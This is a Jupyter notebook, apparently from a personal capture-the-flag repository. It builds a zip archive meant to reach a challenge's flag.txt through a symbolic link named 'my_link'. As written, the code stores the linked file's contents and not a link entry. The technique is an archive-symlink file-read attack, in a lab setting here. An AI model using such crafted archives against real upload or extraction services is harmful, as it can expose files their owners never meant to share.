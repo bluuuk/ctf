{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "import zipfile\n",
    "import os\n",
    "\n",
    "zip_file = zipfile.ZipFile('my_archive.zip', mode='w')\n",
    "\n",
    "# create a symbolic link\n",
    "os.symlink('/Users/bluk/Developer/ctf/challenges/disc/folders/flag.txt', 'my_link')\n",
    "\n",
    "# add the link target to the zip file\n",
    "link_target = os.readlink('my_link')\n",
    "zip_file.write(link_target, 'my_link')\n",
    "\n",
    "zip_file.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "env",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.2"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
